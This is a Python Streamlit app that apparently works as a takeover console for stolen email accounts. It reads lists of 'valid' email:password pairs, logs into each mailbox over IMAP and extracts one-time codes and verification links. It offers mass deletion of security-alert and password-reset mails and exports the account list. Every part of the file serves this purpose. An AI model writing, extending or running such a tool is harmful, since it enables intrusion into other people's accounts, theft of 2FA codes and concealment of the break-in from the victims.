import streamlit as st
import imaplib
import poplib
import glob
import os
import re
import base64
from typing import List, Set, Tuple, Optional
from enum import Enum
import email
from email.header import decode_header
from email import message_from_bytes
from hosts import host_list

# 1. Mobile & Desktop Responsive Configuration & Keep-Alive Injector
st.set_page_config(
    page_title="Bobito Mailbox Reader & Portal Hub",
    page_icon="📥",
    layout="wide",
    initial_sidebar_state="expanded"
)

# Keep-alive injector script for mobile/Safari session stability
st.markdown(
    """
    <script>
    setInterval(function(){
        fetch('/_stcore/health').then(res => {});
    }, 30000);
    </script>
    """,
    unsafe_allow_html=True
)

# Session State Initialization
if "mb_log" not in st.session_state:
    st.session_state.mb_log = []
if "mb_folders" not in st.session_state:
    st.session_state.mb_folders = ["INBOX"]
if "mb_host" not in st.session_state:
    st.session_state.mb_host = ""
if "current_page" not in st.session_state:
    st.session_state.current_page = 0
if "folder_debug_logs" not in st.session_state:
    st.session_state.folder_debug_logs = []


def log(msg):
    st.session_state.mb_log.insert(0, msg)
    st.session_state.mb_log = st.session_state.mb_log[:50]


def debug_log(msg):
    st.session_state.folder_debug_logs.append(msg)


def load_valid():
    rows, seen = [], set()
    paths = sorted(glob.glob("mail_results/valid_*.txt"), reverse=True)
    paths += [p for p in ("clean_valid_accounts.txt", "valid_accounts.txt") if os.path.exists(p)]
    for path in paths:
        try:
            with open(path, encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if ":" not in line:
                        continue
                    email_val, pwd = line.split(":", 1)
                    combo = f"{email_val.strip()}:{pwd.split('|')[0].strip()}"
                    if combo not in seen:
                        seen.add(combo)
                        rows.append(combo)
        except Exception:
            continue
    return rows


def decode_hdr(value):
    try:
        out = []
        for part, enc in decode_header(value or ""):
            out.append(part.decode(enc or "utf-8", errors="ignore") if isinstance(part, bytes) else str(part))
        return "".join(out)
    except Exception:
        return str(value or "")


# Webmail Portal Mapper
def get_webmail_portal(email_addr):
    if "@" not in email_addr:
        return "https://mail.google.com"
    domain = email_addr.split("@")[-1].lower()
    portals = {
        "gmail.com": "https://mail.google.com",
        "googlemail.com": "https://mail.google.com",
        "outlook.com": "https://outlook.live.com",
        "hotmail.com": "https://outlook.live.com",
        "live.com": "https://outlook.live.com",
        "yahoo.com": "https://mail.yahoo.com",
        "ymail.com": "https://mail.yahoo.com",
        "icloud.com": "https://www.icloud.com/mail",
        "me.com": "https://www.icloud.com/mail",
        "aol.com": "https://mail.aol.com",
        "zoho.com": "https://mail.zoho.com",
        "proton.me": "https://mail.proton.me",
        "protonmail.com": "https://mail.proton.me"
    }
    return portals.get(domain, f"https://www.{domain}")


def decode_imap_utf7(s: str) -> str:
    if "&" not in s:
        return s
    res = []
    for part in s.split("&"):
        if "-" in part and not part.startswith("-"):
            b64_str, rest = part.split("-", 1)
            if b64_str == "":
                res.append("&" + rest)
            else:
                try:
                    b64_padded = b64_str.replace(",", "/") + "=" * ((4 - len(b64_str) % 4) % 4)
                    decoded = base64.b64decode(b64_padded).decode("utf-16be")
                    res.append(decoded + rest)
                except Exception:
                    res.append("&" + part)
        else:
            res.append(part)
    return "".join(res)


# Strictly discover ONLY live mail account folders with detailed debugging logs
def list_folders(mail):
    found = set()
    st.session_state.folder_debug_logs = []
    debug_log("🔍 [ENGINE START] Querying server with wildcard: IMAP LIST '' '*'")

    try:
        typ, data = mail.list('""', "*")
        debug_log(f"📡 [RESPONSE STATUS] Server status: '{typ}', Raw items returned: {len(data) if data else 0}")

        if typ == "OK" and data:
            for idx, item in enumerate(data, 1):
                if not item:
                    continue
                s = item.decode("latin1", errors="ignore") if isinstance(item, bytes) else str(item)
                debug_log(f"  ├─ Raw Line #{idx}: {s}")

                if r"\noselect" in s.lower() or r"\nonexistent" in s.lower():
                    debug_log("  │   ⚠️ FILTERED OUT: Container node flagged as \\Noselect or \\Nonexistent")
                    continue

                quoted = re.findall(r'"((?:\\.|[^"\\])*)"', s)
                name = quoted[-1] if quoted else s.split()[-1]
                name = name.replace('\\"', '"').strip()

                if name and name not in (".", "/", '""', "''"):
                    decoded_folder = decode_imap_utf7(name)
                    if decoded_folder != name:
                        debug_log(f"  │   🌐 UTF-7 DECODED: '{name}' -> '{decoded_folder}'")
                    found.add(decoded_folder)
                    debug_log(f"  │   ✅ DISCOVERED FOLDER: '{decoded_folder}'")
                else:
                    debug_log("  │   ⚠️ IGNORED: Empty or root delimiter token")
        else:
            debug_log("⚠️ [WARNING] Server returned empty or non-OK status for LIST query.")

    except Exception as ex:
        debug_log(f"❌ [EXCEPTION ERROR] Encountered during folder discovery: {ex}")

    if not found:
        debug_log("⚠️ [FALLBACK] No folders detected via LIST; defaulting to ['INBOX']")
        found.add("INBOX")

    sorted_result = sorted(list(found), key=lambda x: (0 if x.lower() == "inbox" else 1, x.lower()))
    debug_log(f"🏁 [ENGINE COMPLETE] Final confirmed selectable folders ({len(sorted_result)}): {sorted_result}")
    return sorted_result


def open_mail(email_addr, password_val, host_val):
    mail = imaplib.IMAP4_SSL(host_val, 993, timeout=20)
    mail.login(email_addr, password_val)
    return mail


def close_mail(mail):
    try:
        mail.logout()
    except Exception:
        try:
            mail.shutdown()
        except Exception:
            pass


# Bot Intelligence & Detection Engine
def is_bot_message(subject, body):
    bot_keywords = [
        "otp", "verification", "verify", "security alert", "password reset",
        "code", "confirm", "login", "auth", "signin", "crypto", "token", "activation"
    ]
    combined = f"{subject} {body}".lower()
    return any(kw in combined for kw in bot_keywords)


# Actionable PIN & Link Extractor
def extract_pins_and_links(text):
    pins = re.findall(r'\b(?<![#\d])\d{4,8}(?![#\d])\b', text)
    urls = re.findall(r'https?://[^\s<>"]+|www\.[^\s<>"]+', text)
    cleaned_urls = [u for u in urls if not any(x in u.lower() for x in ["w3.org", "schema.org", "apple.com/DTDs"])]
    return list(dict.fromkeys(pins)), list(dict.fromkeys(cleaned_urls))


# Boilerplate Clean-Up Utility
def clean_boilerplate(text):
    if not text:
        return ""
    patterns_to_remove = [
        r"(?i)unsubscribe.*?(?:\n|$)",
        r"(?i)privacy policy.*?(?:\n|$)",
        r"(?i)confidentiality notice.*?(?:\n\n|$)",
        r"(?i)this email was sent by.*?(?:\n|$)"
    ]
    cleaned = text
    for pat in patterns_to_remove:
        cleaned = re.sub(pat, "", cleaned)
    return cleaned.strip()


# UI Header & Title
st.title("📥 Bobito Mailbox Reader & Portal Hub")
st.caption("Advanced IMAP Client with Automated Folder Crawling, Bot Intelligence, PIN Extractor, and Webmail Portal Hub.")

valid = load_valid()

# Sidebar Configuration Hub
st.sidebar.header("Account & Connection Hub")
pick = st.sidebar.selectbox("Valid account", valid or ["none"])
custom_email = st.sidebar.text_input("Email override")
custom_pass = st.sidebar.text_input("Password override", type="password")
override = st.sidebar.text_input("IMAP host override")

if custom_email.strip():
    email, password = custom_email.strip(), custom_pass.strip()
elif ":" in pick:
    email, password = pick.split(":", 1)
else:
    email, password = "", ""

st.sidebar.write("**Host order:** " + ", ".join(host_list(email)[:4]) if email else "-")

# Webmail Portal & Dynamic Credentials Hub
if email and password:
    st.sidebar.markdown("---")
    st.sidebar.subheader("🌐 Webmail Portal & Credentials")
    portal_url = get_webmail_portal(email)
    st.sidebar.markdown(f"[Open Webmail Portal]({portal_url})", unsafe_allow_html=True)
    st.sidebar.text_input("Copy Credentials (email:password)", value=f"{email}:{password}")

if st.sidebar.button("Connect & Discover Folders", type="primary"):
    if not email or not password:
        st.error("Need email and password")
    else:
        hosts = [override.strip()] if override.strip() else host_list(email)
        last = "no host"
        connected_host = ""
        folders = ["INBOX"]
        success = False

        with st.spinner("Connecting and discovering folders..."):
            for host in hosts:
                mail_obj = None
                try:
                    mail_obj = open_mail(email, password, host)
                    folders = list_folders(mail_obj)
                    close_mail(mail_obj)
                    connected_host = host
                    success = True
                    break
                except Exception as e:
                    last = f"{host}: {e}"
                    if mail_obj:
                        close_mail(mail_obj)

        if success:
            st.session_state.mb_host = connected_host
            st.session_state.mb_folders = folders
            log(f"Discovered {len(folders)} folders via {connected_host}")
            st.sidebar.success(f"Connected: {connected_host} ({len(folders)} folders)")
        else:
            st.sidebar.error(last)
            log(last)

# Debugging Screen Log Expander
if "folder_debug_logs" in st.session_state and st.session_state.folder_debug_logs:
    with st.expander("🛠️ Live Folder Discovery Screen Log & Server Raw Traces", expanded=True):
        st.code("\n".join(st.session_state.folder_debug_logs), language="text")

# Live Action Log & Export Tools in Sidebar
st.sidebar.markdown("---")
st.sidebar.subheader("📜 Live Action Log")
with st.sidebar.expander("View Activity Log", expanded=False):
    for line in st.session_state.mb_log:
        st.text(line)

if valid:
    st.sidebar.markdown("---")
    st.sidebar.subheader("💾 Export Tools")
    valid_text = "\n".join(valid)
    st.sidebar.download_button(
        label="Download Valid Accounts File",
        data=valid_text,
        file_name="valid_accounts_export.txt",
        mime="text/plain"
    )

# Main Interface: Folder Explorer & Deep Search
col1, col2, col3 = st.columns([2, 1, 1])
with col1:
    folder = st.selectbox("Select Mail Folder", st.session_state.mb_folders)
with col2:
    page_size = st.slider("Page size", 5, 50, 15)
with col3:
    sort_order = st.selectbox("Sort Order", ["Newest First", "Oldest First"])

# Deep Search & Scope Filters
with st.expander("🔍 Deep Keyword Search & Filters", expanded=False):
    search_query = st.text_input("Search term or keyword")
    search_scope = st.selectbox("Search Scope", ["TEXT", "SUBJECT", "FROM", "BODY"])

if st.button("Load & Search Messages", type="primary"):
    host = override.strip() or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
    if not email or not password or not host:
        st.error("Please connect and load folders first.")
    else:
        mail = None
        try:
            with st.spinner(f"Scanning folder '{folder}' on {host}..."):
                mail = open_mail(email, password, host)
                mail.select(f'"{folder}"', readonly=False)

                if search_query.strip():
                    typ, data = mail.search(None, search_scope, f'"{search_query.strip()}"')
                else:
                    typ, data = mail.search(None, "ALL")

                ids = (data[0] or b"").split() if typ == "OK" else []
                if sort_order == "Newest First":
                    ids = list(reversed(ids))

                ids = ids[:page_size]
                messages_data = []

                for mid in ids:
                    typ, msgdata = mail.fetch(mid, "(FLAGS BODY.PEEK[])")
                    if not msgdata or not isinstance(msgdata[0], tuple):
                        continue

                    raw_msg_bytes = msgdata[0][1]
                    msg = message_from_bytes(raw_msg_bytes)

                    subject = decode_hdr(msg.get("Subject", ""))
                    frm = decode_hdr(msg.get("From", ""))
                    date_val = decode_hdr(msg.get("Date", ""))

                    flags_str = str(msgdata[0][0])
                    is_read = "\\Seen" in flags_str

                    body_text = ""
                    if msg.is_multipart():
                        for part in msg.walk():
                            if part.get_content_type() == "text/plain":
                                try:
                                    body_text = part.get_payload(decode=True).decode("utf-8", errors="ignore")
                                    break
                                except Exception:
                                    pass
                    else:
                        try:
                            body_text = msg.get_payload(decode=True).decode("utf-8", errors="ignore")
                        except Exception:
                            pass

                    cleaned_body = clean_boilerplate(body_text)
                    pins, links = extract_pins_and_links(body_text)
                    is_bot = is_bot_message(subject, body_text)

                    messages_data.append({
                        "id": mid.decode(),
                        "from": frm,
                        "subject": subject,
                        "date": date_val,
                        "is_read": is_read,
                        "is_bot": is_bot,
                        "body": cleaned_body,
                        "pins": pins,
                        "links": links,
                        "raw": raw_msg_bytes
                    })

                st.session_state.current_messages = messages_data
                log(f"Loaded {len(messages_data)} messages from {folder}")
        except Exception as e:
            st.error(str(e))
            log(str(e))
        finally:
            if mail:
                close_mail(mail)

# Bot Mail Preview & Mass Deletion Tools
if "current_messages" in st.session_state and st.session_state.current_messages:
    bot_msgs = [m for m in st.session_state.current_messages if m["is_bot"]]
    if bot_msgs:
        st.markdown("---")
        st.subheader(f"🤖 Bot & Security Intelligence Detected ({len(bot_msgs)} messages)")
        if st.button("🗑️ Mass Delete All Detected Bot/Spam Messages"):
            host = override.strip() or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
            mail = None
            try:
                mail = open_mail(email, password, host)
                mail.select(f'"{folder}"', readonly=False)
                for bm in bot_msgs:
                    mail.store(bm["id"], '+FLAGS', '\\Deleted')
                mail.expunge()
                st.success(f"Successfully deleted {len(bot_msgs)} bot messages!")
                log(f"Mass deleted {len(bot_msgs)} bot messages from {folder}")
                mail.logout()
                st.rerun()
            except Exception as e:
                st.error(f"Error during mass delete: {e}")
            finally:
                if mail:
                    close_mail(mail)

    st.markdown("---")
    st.subheader(f"✉️ Message Stream ({len(st.session_state.current_messages)} loaded)")

    for idx, msg in enumerate(st.session_state.current_messages):
        status_icon = "📖" if msg["is_read"] else "📩"
        bot_badge = " [🤖 BOT/OTP]" if msg["is_bot"] else ""

        with st.expander(f"{status_icon} [{msg['date']}] {msg['from']} - {msg['subject']}{bot_badge}"):
            st.write(f"**From:** {msg['from']}")
            st.write(f"**Subject:** {msg['subject']}")
            st.write(f"**Date:** {msg['date']}")

            if msg["pins"]:
                st.success(f"🔑 **Extracted PINs / Verification Codes:** {', '.join(msg['pins'])}")
            if msg["links"]:
                st.markdown("🔗 **Actionable Verification Links:**")
                for link in msg["links"]:
                    st.markdown(f"- [{link}]({link})", unsafe_allow_html=True)

            st.markdown("---")
            st.text_area("Cleaned Message Body", value=msg["body"], height=150, key=f"body_{msg['id']}_{idx}")

            # Per-Message Interactive Operations
            op_col1, op_col2, op_col3, op_col4 = st.columns(4)

            host = override.strip() or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]

            with op_col1:
                if not msg["is_read"]:
                    if st.button("Mark as Read", key=f"read_{msg['id']}_{idx}"):
                        try:
                            m_client = open_mail(email, password, host)
                            m_client.select(f'"{folder}"', readonly=False)
                            m_client.store(msg["id"], '+FLAGS', '\\Seen')
                            close_mail(m_client)
                            st.success("Marked as read!")
                            st.rerun()
                        except Exception as ex:
                            st.error(str(ex))

            with op_col2:
                target_move = st.selectbox("Move to", st.session_state.mb_folders, key=f"mv_sel_{msg['id']}_{idx}")
                if st.button("Move Message", key=f"mv_btn_{msg['id']}_{idx}"):
                    try:
                        m_client = open_mail(email, password, host)
                        m_client.select(f'"{folder}"', readonly=False)
                        m_client.copy(msg["id"], f'"{target_move}"')
                        m_client.store(msg["id"], '+FLAGS', '\\Deleted')
                        m_client.expunge()
                        close_mail(m_client)
                        st.success(f"Moved to {target_move}!")
                        st.rerun()
                    except Exception as ex:
                        st.error(str(ex))

            with op_col3:
                if st.button("Delete Message", key=f"del_{msg['id']}_{idx}"):
                    try:
                        m_client = open_mail(email, password, host)
                        m_client.select(f'"{folder}"', readonly=False)
                        m_client.store(msg["id"], '+FLAGS', '\\Deleted')
                        m_client.expunge()
                        close_mail(m_client)
                        st.success("Deleted message!")
                        st.rerun()
                    except Exception as ex:
                        st.error(str(ex))

            with op_col4:
                with st.popover("View Raw RFC822"):
                    st.code(msg["raw"].decode("utf-8", errors="ignore"))
